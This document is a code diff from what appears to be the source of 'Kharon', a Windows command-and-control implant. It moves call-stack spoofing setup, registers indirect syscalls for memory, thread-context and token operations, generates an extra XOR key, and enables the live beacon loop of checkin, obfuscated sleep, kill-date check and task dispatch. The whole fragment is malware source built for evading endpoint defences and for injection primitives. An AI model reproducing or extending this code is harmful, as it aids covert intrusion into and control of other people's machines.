@@ -93,15 +93,19 @@ auto DECLFN Kharon::Init(
     this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
     this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
 
-    if ( !this->Mscoree.Handle   ) this->Mscoree.Handle   = Lib->Load( "mscoree.dll" );
-    if ( !this->Advapi32.Handle  ) this->Advapi32.Handle  = Lib->Load( "advapi32.dll" );
-    if ( !this->Wininet.Handle   ) this->Wininet.Handle   = Lib->Load( "wininet.dll" );
-    if ( !this->Oleaut32.Handle  ) this->Oleaut32.Handle  = Lib->Load( "oleaut32.dll" );
-    if ( !this->User32.Handle    ) this->User32.Handle    = Lib->Load( "user32.dll" );
-    if ( !this->Shell32.Handle   ) this->Shell32.Handle   = Lib->Load( "shell32.dll" );
-    if ( !this->Cryptbase.Handle ) this->Cryptbase.Handle = Lib->Load( "cryptbase.dll" );
-    if ( !this->Ws2_32.Handle    ) this->Ws2_32.Handle    = Lib->Load( "ws2_32.dll" );
-    if ( !this->Msvcrt.Handle    ) this->Msvcrt.Handle    = Lib->Load( "msvcrt.dll" );
+    /* ========= [ calculate stack for spoof ] ========= */
+    this->Spf->Setup.First.Size  = this->Spf->StackSizeWrapper( this->Spf->Setup.First.Ptr );
+    this->Spf->Setup.Second.Size = this->Spf->StackSizeWrapper( this->Spf->Setup.Second.Ptr );
+
+    if ( ! this->Mscoree.Handle   ) this->Mscoree.Handle   = this->Lib->Load( "mscoree.dll" );
+    if ( ! this->Advapi32.Handle  ) this->Advapi32.Handle  = this->Lib->Load( "advapi32.dll" );
+    if ( ! this->Wininet.Handle   ) this->Wininet.Handle   = this->Lib->Load( "wininet.dll" );
+    if ( ! this->Oleaut32.Handle  ) this->Oleaut32.Handle  = this->Lib->Load( "oleaut32.dll" );
+    if ( ! this->User32.Handle    ) this->User32.Handle    = this->Lib->Load( "user32.dll" );
+    if ( ! this->Shell32.Handle   ) this->Shell32.Handle   = this->Lib->Load( "shell32.dll" );
+    if ( ! this->Cryptbase.Handle ) this->Cryptbase.Handle = this->Lib->Load( "cryptbase.dll" );
+    if ( ! this->Ws2_32.Handle    ) this->Ws2_32.Handle    = this->Lib->Load( "ws2_32.dll" );
+    if ( ! this->Msvcrt.Handle    ) this->Msvcrt.Handle    = this->Lib->Load( "msvcrt.dll" );
 
     RSL_IMP( Mscoree );
     RSL_IMP( Advapi32 );
@@ -140,15 +144,21 @@ auto DECLFN Kharon::Init(
     }
 
     /* ========= [ syscalls setup ] ========= */
-    this->Sys->Ext[Sys::Alloc].Address    = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
-    this->Sys->Ext[Sys::Write].Address    = U_PTR( this->Ntdll.NtWriteVirtualMemory );
-    this->Sys->Ext[Sys::OpenProc].Address = U_PTR( this->Ntdll.NtOpenProcess );
-    this->Sys->Ext[Sys::OpenThrd].Address = U_PTR( this->Ntdll.NtOpenThread );
-    this->Sys->Ext[Sys::QueueApc].Address = U_PTR( this->Ntdll.NtQueueApcThread );
-    this->Sys->Ext[Sys::Protect].Address  = U_PTR( this->Ntdll.NtProtectVirtualMemory );
-    this->Sys->Ext[Sys::CrThread].Address = U_PTR( this->Ntdll.NtCreateThreadEx );
-    this->Sys->Ext[Sys::CrSectn].Address  = U_PTR( this->Ntdll.NtCreateSection );
-    this->Sys->Ext[Sys::MapView].Address  = U_PTR( this->Ntdll.NtMapViewOfSection );
+    this->Sys->Ext[Sys::Alloc].Address       = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
+    this->Sys->Ext[Sys::Write].Address       = U_PTR( this->Ntdll.NtWriteVirtualMemory );
+    this->Sys->Ext[Sys::OpenProc].Address    = U_PTR( this->Ntdll.NtOpenProcess );
+    this->Sys->Ext[Sys::OpenThrd].Address    = U_PTR( this->Ntdll.NtOpenThread );
+    this->Sys->Ext[Sys::QueueApc].Address    = U_PTR( this->Ntdll.NtQueueApcThread );
+    this->Sys->Ext[Sys::Protect].Address     = U_PTR( this->Ntdll.NtProtectVirtualMemory );
+    this->Sys->Ext[Sys::CrThread].Address    = U_PTR( this->Ntdll.NtCreateThreadEx );
+    this->Sys->Ext[Sys::CrSectn].Address     = U_PTR( this->Ntdll.NtCreateSection );
+    this->Sys->Ext[Sys::MapView].Address     = U_PTR( this->Ntdll.NtMapViewOfSection );
+    this->Sys->Ext[Sys::Read].Address        = U_PTR( this->Ntdll.NtReadVirtualMemory );
+    this->Sys->Ext[Sys::Free].Address        = U_PTR( this->Ntdll.NtFreeVirtualMemory );
+    this->Sys->Ext[Sys::GetCtxThrd].Address  = U_PTR( this->Ntdll.NtGetContextThread );
+    this->Sys->Ext[Sys::SetCtxThrd].Address  = U_PTR( this->Ntdll.NtSetContextThread );
+    this->Sys->Ext[Sys::OpenPrToken].Address = U_PTR( this->Ntdll.NtOpenThreadTokenEx );
+    this->Sys->Ext[Sys::OpenThToken].Address = U_PTR( this->Ntdll.NtOpenProcessTokenEx );
 
     for ( INT i = 0; i < Sys::Last -1; i++ ) {
         this->Sys->Fetch( i );
@@ -160,14 +170,11 @@ auto DECLFN Kharon::Init(
     if ( this->Spf->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_SPOOF;
     if ( this->Sys->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_INDIRECT;
 
-    /* ========= [ key generation to xor heap ] ========= */
+    /* ========= [ key generation to xor heap and package ] ========= */
     for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
         this->Crp->XorKey[i] = (BYTE)Rnd32();
+        this->Crp->LokKey[i] = (BYTE)Rnd32();
     }
-
-    /* ========= [ calculate stack for spoof ] ========= */
-    this->Spf->Setup.First.Size  = this->Spf->StackSizeWrapper( this->Spf->Setup.First.Ptr );
-    this->Spf->Setup.Second.Size = this->Spf->StackSizeWrapper( this->Spf->Setup.Second.Ptr );
 
     /* ========= [ informations collection ] ========= */
     CHAR   cProcessorName[MAX_PATH] = { 0 };
@@ -312,28 +319,22 @@ auto DECLFN Kharon::Start(
     // do checkin routine (request + validate connection)
     //
 
-    KhDbgz( "======================================" )
-    this->Spf->Call( 
-        this->Krnl32.Handle, (UPTR)this->Krnl32.VirtualAlloc,
-        0, 0x1000, 0x3000, 0x40, 0 
-    );
+    this->Tsp->Checkin();
 
-    // this->Tsp->Checkin();
+    do {            
+        //
+        // use the wrapper sleep function to run the 
+        //
+        this->Mk->Main( this->Session.SleepTime );
 
-    // do {            
-    //     //
-    //     // use the wrapper sleep function to run the 
-    //     //
-    //     this->Mk->Main( this->Session.SleepTime );
-
-    //     //
-    //     // kill date check and perform routine
-    //     //
-    //     this->Usf->CheckKillDate();
+        //
+        // kill date check and perform routine
+        //
+        this->Usf->CheckKillDate();
    
-    //     //
-    //     // start the dispatcher task routine
-    //     //
-    //     this->Tk->Dispatcher();
-    // } while( 1 );
+        //
+        // start the dispatcher task routine
+        //
+        this->Tk->Dispatcher();
+    } while( 1 );
 }
